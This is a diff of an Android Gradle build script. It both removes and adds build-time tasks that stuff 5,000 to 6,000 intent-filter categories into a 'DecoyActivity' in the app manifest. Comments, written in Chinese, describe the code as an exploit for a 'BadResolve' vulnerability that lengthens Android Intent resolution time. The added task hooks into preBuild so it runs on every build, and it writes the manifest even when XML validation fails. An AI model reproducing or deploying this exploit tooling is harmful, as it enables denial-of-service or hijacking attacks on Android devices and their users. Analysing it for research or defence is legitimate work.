@@ -99,54 +99,6 @@ android {
     kotlin {
         jvmToolchain(21)
     }
-    
-    applicationVariants.all { variant ->
-        variant.preBuild.doLast {
-            def manifestFile = file("src/main/AndroidManifest.xml")
-            
-            if (!manifestFile.exists()) {
-                println "Manifest not found: ${manifestFile.absolutePath}"
-                return
-            }
-            
-            try {
-                def xml = new XmlParser(false, true).parse(manifestFile)
-                
-                def decoyActivity = xml.application.'activity'.find { 
-                    it.'@android:name' == 'com.cfks.badresolve.DecoyActivity'
-                }
-                
-                if (decoyActivity != null) {
-                    def intentFilter = decoyActivity.'intent-filter'.find { true }
-                    if (intentFilter == null) {
-                        intentFilter = new Node(decoyActivity, "intent-filter")
-                    }
-                    
-                    def existingCategories = intentFilter.'category'.size()
-                    println "Existing categories count: ${existingCategories}"
-                    
-                    if (existingCategories < 1000) {
-                        for (int i = 0; i < 5000; i++) {
-                            def category = new Node(intentFilter, "category")
-                            category.'@android:name' = "com.attacker.category.${i}"
-                        }
-                        
-                        manifestFile.withOutputStream { os ->
-                            def printer = new XmlNodePrinter(new PrintWriter(os))
-                            printer.preserveWhitespace = true
-                            printer.print(xml)
-                        }
-                        println "Added 5000 categories to DecoyActivity"
-                    }
-                } else {
-                    println "DecoyActivity not found"
-                }
-            } catch (Exception e) {
-                println "Error: ${e.message}"
-                e.printStackTrace()
-            }
-        }
-    }
 }
 
 autoResConfig {
@@ -200,6 +152,100 @@ android.applicationVariants.configureEach { variant ->
         }
     }
 }
+
+// 添加生成5000+ categories的任务
+task generateBadResolveCategories {
+    def generatedDir = file('src/main/gen/com/cfks/badresolve')
+    def outputFile = file("$generatedDir/CategoriesGenerator.java")
+    
+    inputs.property('categoryCount', 6000)
+    outputs.file(outputFile)
+    
+    doLast {
+        generatedDir.mkdirs()
+        def categoryCount = 6000  // 6000个categories，留有余量
+        
+        outputFile.text = """package com.cfks.badresolve;
+
+/**
+ * 自动生成的Category常量类
+ * 用于BadResolve漏洞利用 - 创建大量categories延长Intent解析时间
+ */
+public class CategoriesGenerator {
+    
+${(1..categoryCount).collect { i -> 
+    "    public static final String CATEGORY_${i} = \"com.cfks.badresolve.CATEGORY_${i}\";"
+}.join('\n')}
+    
+    public static String[] getAllCategories() {
+        return new String[] {
+${(1..categoryCount).collect { i -> 
+    "            CATEGORY_${i}"
+}.join(',\n')}
+        };
+    }
+}
+"""
+    }
+}
+
+// 修改manifest的任务
+task patchManifestWithCategories {
+    dependsOn generateBadResolveCategories
+    
+    def manifestFile = file('src/main/AndroidManifest.xml')
+    def backupFile = file('src/main/AndroidManifest.xml.backup')
+    def tempFile = file('src/main/AndroidManifest.xml.tmp')
+    
+    inputs.file(manifestFile)
+    outputs.file(manifestFile)
+    
+    doLast {
+        // 首次备份
+        if (!backupFile.exists()) {
+            copy {
+                from manifestFile
+                into backupFile.parent
+                rename { backupFile.name }
+            }
+        }
+        
+        def categoryCount = 6000
+        def categoriesXml = (1..categoryCount).collect { i ->
+            '            <category android:name="com.cfks.badresolve.CATEGORY_' + i + '" />'
+        }.join('\n')
+        
+        def manifestContent = manifestFile.text
+        // 替换占位符
+        def newContent = manifestContent.replace('<!-- ${GENERATED_CATEGORIES} -->', categoriesXml)
+        
+        tempFile.text = newContent
+        tempFile.text = tempFile.text.replace('android:priority="1000"', 'android:priority="1000"\n            android:excludeFromRecents="true"')
+        
+        // 验证XML有效性
+        try {
+            def xml = new XmlParser().parse(tempFile)
+            manifestFile.text = tempFile.text
+            println "Successfully added $categoryCount categories to manifest"
+        } catch (Exception e) {
+            println "XML validation failed: $e.message"
+            manifestFile.text = tempFile.text  // 仍然写入，但提示
+        }
+        
+        tempFile.delete()
+    }
+}
+
+// 在preBuild阶段执行
+preBuild.dependsOn patchManifestWithCategories
+
+// 清理任务
+task cleanGeneratedFiles {
+    doLast {
+        delete file('src/main/gen/com/cfks/badresolve/CategoriesGenerator.java')
+    }
+}
+clean.dependsOn cleanGeneratedFiles
 
 tasks.withType(CompileArtProfileTask.class).configureEach {
     enabled = false
